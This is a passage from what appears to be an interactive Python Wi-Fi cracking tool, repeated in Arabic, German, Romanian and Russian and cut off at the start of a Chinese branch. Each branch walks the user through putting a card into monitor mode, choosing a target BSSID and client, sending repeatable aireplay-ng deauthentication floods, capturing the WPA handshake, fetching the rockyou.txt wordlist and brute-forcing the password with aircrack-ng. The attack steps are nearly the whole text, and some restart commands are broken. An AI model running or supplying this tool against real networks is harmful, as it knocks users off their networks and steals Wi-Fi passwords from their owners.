        print("الآن سأعرض لك أمرًا يجب تنفيذه في طرفية أخرى لالتقاط مصافحة الاتصال")
        print("أولًا أخبرني باسم الملف لحفظ التدقيق:")
        nombre_auditoria = input().strip()
        print(f"\nالأمر هو:\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {nombre_auditoria} {tarjeta}mon")
        print("عندما يتصل أحد الأجهزة، يجب إدخال STATION للجهاز")

        station = input("أدخل STATION (عنوان MAC للجهاز): ").strip()

        print("كم عدد الطلبات التي تريد إرسالها في المرة؟ (موصى به 9)")
        peticiones = input().strip()
        if not peticiones.isdigit():
            print("عدد طلبات غير صالح")
            exit(1)

        print("هل تريد تنفيذ هجوم قطع الاتصال الآن؟ (نعم/لا)")
        decision_desautentificacion1 = input().strip().lower()

        if decision_desautentificacion1 == "نعم":
            subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
        elif decision_desautentificacion1 == "لا":
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()

        while True:
            print("هل تريد إرسال الهجوم مرة أخرى؟ (نعم/لا)")
            decision = input().strip().lower()
            if decision == "نعم":
                subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
            elif decision == "لا":
                break

        print("ممتاز، بقي خطوة واحدة فقط.")
        print("هل قام السكربت بتحميل ملف rockyou.txt؟ (نعم/لا)")
        instalado = input().strip().lower()

        if instalado == "نعم":
            directorio = "rockyou.txt"
        else:
            directorio = input("أدخل مسار ملف الكلمات: ").strip()

        print("هل تريد البدء في كسر كلمة المرور الآن؟ (نعم/لا)")
        decision_final = input().strip().lower()

        if decision_final == "نعم":
            subprocess.run(["sudo", "aircrack-ng", "-b", BSSID, "-w", directorio, nombre_auditoria + "-01.cap"])
        else:
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()
        if decision_final == "لا":
            print("\nجاري إيقاف وضع المراقبة...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("تم إيقاف وضع المراقبة")
            print("ما هو نظام التشغيل الذي تستخدمه؟")
            print("جاري تفعيل الإنترنت")
            if opcion_os == "1":
                print("جاري تفعيل الواي فاي على أرش لينكس/مانجارو...")
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "2":
                print("جاري التثبيت على فيدورا/RHEL/سنتوس...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "3":
                print("جاري التثبيت على الإصدارات القديمة...")
                subprocess.run(["sudo", "service", "network", "restart"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "4":
                print("جاري التثبيت على دبيان/أوبنتو...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
                                                                                                                            #aleman
    elif idioma == "5":
        def detectar_sistema_operativo():
            try:
                resultado = subprocess.run(["lsb_release", "-d"], capture_output=True, text=True)
                if resultado.returncode == 0:
                    descripcion = resultado.stdout.lower()
                    if "arch" in descripcion or "manjaro" in descripcion:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in descripcion or "red hat" in descripcion or "rhel" in descripcion or "centos" in descripcion:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in descripcion or "ubuntu" in descripcion:
                        return "Debian/Ubuntu-basierte Distribution", "4"
            except Exception:
                pass

            try:
                with open("/etc/os-release", "r") as f:
                    contenido = f.read().lower()
                    if "arch" in contenido or "manjaro" in contenido:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in contenido or "red hat" in contenido or "rhel" in contenido or "centos" in contenido:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in contenido or "ubuntu" in contenido:
                        return "Debian/Ubuntu-basierte Distribution", "4"
            except Exception:
                pass

            return None, None

        os_detectado, opcion_os = detectar_sistema_operativo()
        if os_detectado:
            print(f"\nErkanntes Betriebssystem: {os_detectado}")
            respuesta_os = input("Ist das korrekt? (ja/nein): ").strip().lower()
            if respuesta_os != "ja":
                os_detectado = None

        if not os_detectado:
            print("\nWelches Betriebssystem verwenden Sie? Wählen Sie die Nummer:")
            print("1--> Arch Linux / Manjaro")
            print("2--> Fedora / RHEL / CentOS")
            print("3--> Fedora/RHEL/CentOS (ältere Versionen)")
            print("4--> Debian/Ubuntu-basierte Distribution")
            opcion_os = input("Option: ").strip()

        while True:
            print("\nHaben Sie aircrack-ng installiert? (ja/nein)")
            respuesta_instalacion = input().strip().lower()

            if respuesta_instalacion == "nein":
                if opcion_os == "1":
                    print("Installiere auf Arch Linux/Manjaro...")
                    subprocess.run(["sudo", "pacman", "-Sy", "aircrack-ng", "--noconfirm"])
                elif opcion_os == "2":
                    print("Installiere auf Fedora/RHEL/CentOS...")
                    subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng"])
                elif opcion_os == "3":
                    print("Installiere auf älteren Versionen...")
                    subprocess.run(["sudo", "yum", "install", "-y", "aircrack-ng"])
                elif opcion_os == "4":
                    print("Installiere auf Debian/Ubuntu...")
                    subprocess.run("sudo apt update && sudo apt install -y aircrack-ng", shell=True)
                break

            elif respuesta_instalacion == "ja":
                break

        print("Haben Sie eine Passwortdatei?")
        print("ja/nein")
        decision_directorio = input().strip().lower()

        if decision_directorio == "nein":
            subprocess.run(["sudo", "wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"])
        else:
            print("Ok, fahren wir fort")

        while True:
            print("\nWissen Sie, welche Netzwerkkarte Sie haben? (ja/nein)")
            respuesta_tarjeta = input().strip().lower()

            if respuesta_tarjeta == "ja":
                break
            elif respuesta_tarjeta == "nein":
                print("\nZeige Netzwerkschnittstellen...")
                subprocess.run(["ip", "a"])
                print("\nSuchen Sie die WiFi-Schnittstelle (normalerweise wlan0, wlp2s0, etc.)")
                time.sleep(2)

        print("\nGeben Sie den Namen Ihrer Netzwerkkarte ein (z.B. wlan0):")
        tarjeta = input().strip()

        print(f"\nSetze {tarjeta} in den Monitor-Modus...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        subprocess.run(["sudo", "airmon-ng", "start", tarjeta])

        print("\nScanne WiFi-Netzwerke...")
        print("Wie viele Sekunden möchten Sie scannen?")
        try:
            tiempo_auditoria = int(input())
        except ValueError:
            print("Fehler: Bitte eine gültige Zahl eingeben")
            exit(1)

        proceso = subprocess.Popen(["sudo", "airodump-ng", f"{tarjeta}mon"])

        try:
            time.sleep(tiempo_auditoria)
        except KeyboardInterrupt:
            print("\nScan abgebrochen")
        finally:
            proceso.terminate()
            proceso.wait()
            subprocess.run(["sudo", "pkill", "airodump-ng"])

        print("\nMöchten Sie fortfahren? (ja/nein)")
        seguir_1 = input().strip().lower()

        if seguir_1 == "nein":
            print("\nBeende Monitor-Modus...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("Monitor-Modus beendet")
            print("Welches Betriebssystem verwenden Sie?")
            print("Aktiviere Internet")
            if opcion_os == "1":
                print("Aktiviere WiFi auf Arch Linux/Manjaro...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "subprocess.run"])
                exit()
            elif opcion_os == "2":
                print("Installiere auf Fedora/RHEL/CentOS...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                exit()
            elif opcion_os == "3":
                print("Installiere auf älteren Versionen...")
                subprocess.run(["sudo", "service", "network", "restart"])
                exit()
            elif opcion_os == "4":
                print("Installiere auf Debian/Ubuntu...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                exit()
            exit()
        if seguir_1 == "ja":
            print("\nFahre mit dem Prozess fort...")

        print("Nun geben Sie mir die Netzwerkdaten")
        print("Ich benötige:")
        print("BSSID:")
        BSSID = input().strip()
        print("Kanal (CH):")
        CH = input().strip()

        subprocess.run(["sudo", "iwconfig", f"{tarjeta}mon", "channel", CH])

        print("Nun zeige ich Ihnen einen Befehl, den Sie in einem anderen Terminal ausführen müssen, um den Handshake zu erfassen")
        print("Zuerst geben Sie mir den Dateinamen für die Audit-Datei:")
        nombre_auditoria = input().strip()
        print(f"\nDer Befehl lautet:\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {nombre_auditoria} {tarjeta}mon")
        print("Wenn sich jemand verbindet, müssen Sie die STATION des Geräts eingeben")

        station = input("Geben Sie die STATION (MAC des Geräts) ein: ").strip()

        print("Wie viele Anfragen möchten Sie auf einmal senden? (empfohlen 9)")
        peticiones = input().strip()
        if not peticiones.isdigit():
            print("Ungültige Anzahl von Anfragen")
            exit(1)

        print("Möchten Sie nun den Deauthentifizierungsangriff ausführen? (ja/nein)")
        decision_desautentificacion1 = input().strip().lower()

        if decision_desautentificacion1 == "ja":
            subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
        elif decision_desautentificacion1 == "nein":
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()

        while True:
            print("Möchten Sie den Angriff erneut senden? (ja/nein)")
            decision = input().strip().lower()
            if decision == "ja":
                subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
            elif decision == "nein":
                break

        print("Perfekt, nur noch ein Schritt.")
        print("Hat das Skript die rockyou.txt-Datei heruntergeladen? (ja/nein)")
        instalado = input().strip().lower()

        if instalado == "ja":
            directorio = "rockyou.txt"
        else:
            directorio = input("Geben Sie den Pfad zur Wortliste ein: ").strip()

        print("Möchten Sie jetzt mit der Brute-Force-Attacke beginnen? (ja/nein)")
        decision_final = input().strip().lower()

        if decision_final == "ja":
            subprocess.run(["sudo", "aircrack-ng", "-b", BSSID, "-w", directorio, nombre_auditoria + "-01.cap"])
        else:
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()
        if decision_final == "nein":
            print("\nBeende Monitor-Modus...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("Monitor-Modus beendet")
            print("Welches Betriebssystem verwenden Sie?")
            print("Aktiviere Internet")
            if opcion_os == "1":
                print("Aktiviere WiFi auf Arch Linux/Manjaro...")
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "2":
                print("Installiere auf Fedora/RHEL/CentOS...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "3":
                print("Installiere auf älteren Versionen...")
                subprocess.run(["sudo", "service", "network", "restart"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "4":
                print("Installiere auf Debian/Ubuntu...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
                                                                                                                            #rumano
    elif idioma == "6":
        def detectar_sistema_operativo():
            try:
                resultado = subprocess.run(["lsb_release", "-d"], capture_output=True, text=True)
                if resultado.returncode == 0:
                    descripcion = resultado.stdout.lower()
                    if "arch" in descripcion or "manjaro" in descripcion:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in descripcion or "red hat" in descripcion or "rhel" in descripcion or "centos" in descripcion:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in descripcion or "ubuntu" in descripcion:
                        return "Distribuție bazată pe Debian/Ubuntu", "4"
            except Exception:
                pass

            try:
                with open("/etc/os-release", "r") as f:
                    contenido = f.read().lower()
                    if "arch" in contenido or "manjaro" in contenido:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in contenido or "red hat" in contenido or "rhel" in contenido or "centos" in contenido:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in contenido or "ubuntu" in contenido:
                        return "Distribuție bazată pe Debian/Ubuntu", "4"
            except Exception:
                pass

            return None, None

        os_detectado, opcion_os = detectar_sistema_operativo()
        if os_detectado:
            print(f"\nSistem de operare detectat: {os_detectado}")
            respuesta_os = input("Este corect? (da/nu): ").strip().lower()
            if respuesta_os != "da":
                os_detectado = None

        if not os_detectado:
            print("\nCe sistem de operare aveți? Selectați numărul:")
            print("1--> Arch Linux / Manjaro")
            print("2--> Fedora / RHEL / CentOS")
            print("3--> Fedora/RHEL/CentOS (versiuni vechi)")
            print("4--> Distribuție bazată pe Debian/Ubuntu")
            opcion_os = input("Opțiune: ").strip()

        while True:
            print("\nAveți aircrack-ng instalat? (da/nu)")
            respuesta_instalacion = input().strip().lower()

            if respuesta_instalacion == "nu":
                if opcion_os == "1":
                    print("Instalare pe Arch Linux/Manjaro...")
                    subprocess.run(["sudo", "pacman", "-Sy", "aircrack-ng", "--noconfirm"])
                elif opcion_os == "2":
                    print("Instalare pe Fedora/RHEL/CentOS...")
                    subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng"])
                elif opcion_os == "3":
                    print("Instalare pe versiuni vechi...")
                    subprocess.run(["sudo", "yum", "install", "-y", "aircrack-ng"])
                elif opcion_os == "4":
                    print("Instalare pe Debian/Ubuntu...")
                    subprocess.run("sudo apt update && sudo apt install -y aircrack-ng", shell=True)
                break

            elif respuesta_instalacion == "da":
                break

        print("Aveți un fișier cu parole?")
        print("da/nu")
        decision_directorio = input().strip().lower()

        if decision_directorio == "nu":
            subprocess.run(["sudo", "wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"])
        else:
            print("Ok, să continuăm")

        while True:
            print("\nȘtiți ce placă de rețea aveți? (da/nu)")
            respuesta_tarjeta = input().strip().lower()

            if respuesta_tarjeta == "da":
                break
            elif respuesta_tarjeta == "nu":
                print("\nSe afișează interfețele de rețea...")
                subprocess.run(["ip", "a"])
                print("\nCăutați interfața WiFi (de obicei wlan0, wlp2s0, etc.)")
                time.sleep(2)

        print("\nIntroduceți numele plăcii de rețea (ex: wlan0):")
        tarjeta = input().strip()

        print(f"\nSe activează modul monitor pentru {tarjeta}...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        subprocess.run(["sudo", "airmon-ng", "start", tarjeta])

        print("\nSe scanează rețelele WiFi...")
        print("Câte secunde doriți să scanați?")
        try:
            tiempo_auditoria = int(input())
        except ValueError:
            print("Eroare: Introduceți un număr valid")
            exit(1)

        proceso = subprocess.Popen(["sudo", "airodump-ng", f"{tarjeta}mon"])

        try:
            time.sleep(tiempo_auditoria)
        except KeyboardInterrupt:
            print("\nScanare întreruptă")
        finally:
            proceso.terminate()
            proceso.wait()
            subprocess.run(["sudo", "pkill", "airodump-ng"])

        print("\nDoriți să continuați? (da/nu)")
        seguir_1 = input().strip().lower()

        if seguir_1 == "nu":
            print("\nSe oprește modul monitor...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("Modul monitor oprit")
            print("Ce sistem de operare folosiți?")
            print("Se activează internetul")
            if opcion_os == "1":
                print("Se activează WiFi pe Arch Linux/Manjaro...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "subprocess.run"])
                exit()
            elif opcion_os == "2":
                print("Instalare pe Fedora/RHEL/CentOS...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                exit()
            elif opcion_os == "3":
                print("Instalare pe versiuni vechi...")
                subprocess.run(["sudo", "service", "network", "restart"])
                exit()
            elif opcion_os == "4":
                print("Instalare pe Debian/Ubuntu...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                exit()
            exit()
        if seguir_1 == "da":
            print("\nSe continuă procesul...")

        print("Acum spuneți-mi datele rețelei")
        print("Am nevoie de:")
        print("BSSID:")
        BSSID = input().strip()
        print("Canal (CH):")
        CH = input().strip()

        subprocess.run(["sudo", "iwconfig", f"{tarjeta}mon", "channel", CH])

        print("Acum vă voi arăta o comandă pe care trebuie să o rulați într-un alt terminal pentru a captura handshake-ul")
        print("Mai întâi spuneți-mi numele fișierului pentru audit:")
        nombre_auditoria = input().strip()
        print(f"\nComanda este:\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {nombre_auditoria} {tarjeta}mon")
        print("Când cineva se conectează, trebuie să introduceți STATION a dispozitivului")

        station = input("Introduceți STATION (MAC-ul dispozitivului): ").strip()

        print("Câte solicitări doriți să trimiteți deodată? (recomandat 9)")
        peticiones = input().strip()
        if not peticiones.isdigit():
            print("Număr de solicitări invalid")
            exit(1)

        print("Doriți să executați acum atacul de deautentificare? (da/nu)")
        decision_desautentificacion1 = input().strip().lower()

        if decision_desautentificacion1 == "da":
            subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
        elif decision_desautentificacion1 == "nu":
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()

        while True:
            print("Doriți să trimiteți din nou atacul? (da/nu)")
            decision = input().strip().lower()
            if decision == "da":
                subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
            elif decision == "nu":
                break

        print("Perfect, mai este doar un pas.")
        print("Scriptul v-a descărcat fișierul rockyou.txt? (da/nu)")
        instalado = input().strip().lower()

        if instalado == "da":
            directorio = "rockyou.txt"
        else:
            directorio = input("Introduceți calea către dicționar: ").strip()

        print("Doriți să începeți acum forța brută pentru a găsi parola? (da/nu)")
        decision_final = input().strip().lower()

        if decision_final == "da":
            subprocess.run(["sudo", "aircrack-ng", "-b", BSSID, "-w", directorio, nombre_auditoria + "-01.cap"])
        else:
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()
        if decision_final == "nu":
            print("\nSe oprește modul monitor...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("Modul monitor oprit")
            print("Ce sistem de operare folosiți?")
            print("Se activează internetul")
            if opcion_os == "1":
                print("Se activează WiFi pe Arch Linux/Manjaro...")
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "2":
                print("Instalare pe Fedora/RHEL/CentOS...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "3":
                print("Instalare pe versiuni vechi...")
                subprocess.run(["sudo", "service", "network", "restart"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "4":
                print("Instalare pe Debian/Ubuntu...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
                                                                                                                            #ruso
    elif idioma == "7":
        def detectar_sistema_operativo():
            try:
                resultado = subprocess.run(["lsb_release", "-d"], capture_output=True, text=True)
                if resultado.returncode == 0:
                    descripcion = resultado.stdout.lower()
                    if "arch" in descripcion or "manjaro" in descripcion:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in descripcion or "red hat" in descripcion or "rhel" in descripcion or "centos" in descripcion:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in descripcion or "ubuntu" in descripcion:
                        return "Дистрибутив на основе Debian/Ubuntu", "4"
            except Exception:
                pass

            try:
                with open("/etc/os-release", "r") as f:
                    contenido = f.read().lower()
                    if "arch" in contenido or "manjaro" in contenido:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in contenido or "red hat" in contenido or "rhel" in contenido or "centos" in contenido:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in contenido or "ubuntu" in contenido:
                        return "Дистрибутив на основе Debian/Ubuntu", "4"
            except Exception:
                pass

            return None, None

        os_detectado, opcion_os = detectar_sistema_operativo()
        if os_detectado:
            print(f"\nОбнаружена операционная система: {os_detectado}")
            respuesta_os = input("Это правильно? (да/нет): ").strip().lower()
            if respuesta_os != "да":
                os_detectado = None

        if not os_detectado:
            print("\nКакая у вас операционная система? Выберите номер:")
            print("1--> Arch Linux / Manjaro")
            print("2--> Fedora / RHEL / CentOS")
            print("3--> Fedora/RHEL/CentOS (старые версии)")
            print("4--> Дистрибутив на основе Debian/Ubuntu")
            opcion_os = input("Ваш выбор: ").strip()

        while True:
            print("\nУстановлен ли у вас aircrack-ng? (да/нет)")
            respuesta_instalacion = input().strip().lower()

            if respuesta_instalacion == "нет":
                if opcion_os == "1":
                    print("Установка на Arch Linux/Manjaro...")
                    subprocess.run(["sudo", "pacman", "-Sy", "aircrack-ng", "--noconfirm"])
                elif opcion_os == "2":
                    print("Установка на Fedora/RHEL/CentOS...")
                    subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng"])
                elif opcion_os == "3":
                    print("Установка на старых версиях...")
                    subprocess.run(["sudo", "yum", "install", "-y", "aircrack-ng"])
                elif opcion_os == "4":
                    print("Установка на Debian/Ubuntu...")
                    subprocess.run("sudo apt update && sudo apt install -y aircrack-ng", shell=True)
                break

            elif respuesta_instalacion == "да":
                break

        print("Есть ли у вас файл с паролями?")
        print("да/нет")
        decision_directorio = input().strip().lower()

        if decision_directorio == "нет":
            subprocess.run(["sudo", "wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"])
        else:
            print("Хорошо, продолжим")

        while True:
            print("\nЗнаете ли вы название вашей сетевой карты? (да/нет)")
            respuesta_tarjeta = input().strip().lower()

            if respuesta_tarjeta == "да":
                break
            elif respuesta_tarjeta == "нет":
                print("\nПоказываю сетевые интерфейсы...")
                subprocess.run(["ip", "a"])
                print("\nНайдите WiFi интерфейс (обычно wlan0, wlp2s0 и т.д.)")
                time.sleep(2)

        print("\nВведите название вашей сетевой карты (например: wlan0):")
        tarjeta = input().strip()

        print(f"\nПеревод {tarjeta} в режим монитора...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"])
        subprocess.run(["sudo", "airmon-ng", "start", tarjeta])

        print("\nСканирование WiFi сетей...")
        print("Сколько секунд сканировать?")
        try:
            tiempo_auditoria = int(input())
        except ValueError:
            print("Ошибка: введите корректное число")
            exit(1)

        proceso = subprocess.Popen(["sudo", "airodump-ng", f"{tarjeta}mon"])

        try:
            time.sleep(tiempo_auditoria)
        except KeyboardInterrupt:
            print("\nСканирование прервано")
        finally:
            proceso.terminate()
            proceso.wait()
            subprocess.run(["sudo", "pkill", "airodump-ng"])

        print("\nХотите продолжить? (да/нет)")
        seguir_1 = input().strip().lower()

        if seguir_1 == "нет":
            print("\nОстановка режима монитора...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("Режим монитора остановлен")
            print("Какую операционную систему вы используете?")
            print("Восстановление интернета...")
            if opcion_os == "1":
                print("Восстановление WiFi на Arch Linux/Manjaro...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "subprocess.run"])
                exit()
            elif opcion_os == "2":
                print("Установка на Fedora/RHEL/CentOS...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                exit()
            elif opcion_os == "3":
                print("Установка на старых версиях...")
                subprocess.run(["sudo", "service", "network", "restart"])
                exit()
            elif opcion_os == "4":
                print("Установка на Debian/Ubuntu...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                exit()
            exit()
        if seguir_1 == "да":
            print("\nПродолжение процесса...")

        print("Теперь введите данные сети")
        print("Необходимо:")
        print("BSSID:")
        BSSID = input().strip()
        print("Канал (CH):")
        CH = input().strip()

        subprocess.run(["sudo", "iwconfig", f"{tarjeta}mon", "channel", CH])

        print("Сейчас я покажу команду, которую нужно выполнить в другом терминале для захвата handshake")
        print("Сначала укажите имя файла для сохранения аудита:")
        nombre_auditoria = input().strip()
        print(f"\nКоманда:\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {nombre_auditoria} {tarjeta}mon")
        print("Когда кто-то подключится, введите STATION устройства")

        station = input("Введите STATION (MAC устройства): ").strip()

        print("Сколько запросов отправлять за раз? (рекомендуется 9)")
        peticiones = input().strip()
        if not peticiones.isdigit():
            print("Неверное количество запросов")
            exit(1)

        print("Запустить атаку деаутентификации сейчас? (да/нет)")
        decision_desautentificacion1 = input().strip().lower()

        if decision_desautentificacion1 == "да":
            subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
        elif decision_desautentificacion1 == "нет":
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()

        while True:
            print("Отправить атаку снова? (да/нет)")
            decision = input().strip().lower()
            if decision == "да":
                subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
            elif decision == "нет":
                break

        print("Отлично, остался последний шаг.")
        print("Скачал ли скрипт словарь rockyou.txt? (да/нет)")
        instalado = input().strip().lower()

        if instalado == "да":
            directorio = "rockyou.txt"
        else:
            directorio = input("Введите путь к словарю: ").strip()

        print("Начать подбор пароля методом грубой силы? (да/нет)")
        decision_final = input().strip().lower()

        if decision_final == "да":
            subprocess.run(["sudo", "aircrack-ng", "-b", BSSID, "-w", directorio, nombre_auditoria + "-01.cap"])
        else:
            archivos = glob.glob(nombre_auditoria + "*")
            if archivos:
                subprocess.run(["sudo", "rm", "-f"] + archivos)
            exit()
        if decision_final == "нет":
            print("\nОстановка режима монитора...")
            subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
            print("Режим монитора остановлен")
            print("Какую операционную систему вы используете?")
            print("Восстановление интернета...")
            if opcion_os == "1":
                print("Восстановление WiFi на Arch Linux/Manjaro...")
                subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "2":
                print("Установка на Fedora/RHEL/CentOS...")
                subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "3":
                print("Установка на старых версиях...")
                subprocess.run(["sudo", "service", "network", "restart"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
            elif opcion_os == "4":
                print("Установка на Debian/Ubuntu...")
                result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
                if result.returncode != 0:
                    subprocess.run(["sudo", "systemctl", "restart", "networking"])
                archivos = glob.glob(nombre_auditoria + "*")
                if archivos:
                    subprocess.run(["sudo", "rm", "-f"] + archivos)
                exit()
                                                                                                                            #chino
    elif idioma == "8":
        def detectar_sistema_operativo():
            try:
                resultado = subprocess.run(["lsb_release", "-d"], capture_output=True, text=True)
                if resultado.returncode == 0:
                    descripcion = resultado.stdout.lower()
                    if "arch" in descripcion or "manjaro" in descripcion:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in descripcion or "red hat" in descripcion or "rhel" in descripcion or "centos" in descripcion:
                        return "Fedora / RHEL / CentOS", "2"
                    elif "debian" in descripcion or "ubuntu" in descripcion:
                        return "基于 Debian/Ubuntu 的发行版", "4"
            except Exception:
                pass

            try:
                with open("/etc/os-release", "r") as f:
                    contenido = f.read().lower()
                    if "arch" in contenido or "manjaro" in contenido:
                        return "Arch Linux / Manjaro", "1"
                    elif "fedora" in contenido or "red hat" in contenido or "rhel" in contenido or "centos" in contenido:
                        return "Fedora / RHEL / CentOS", "2"
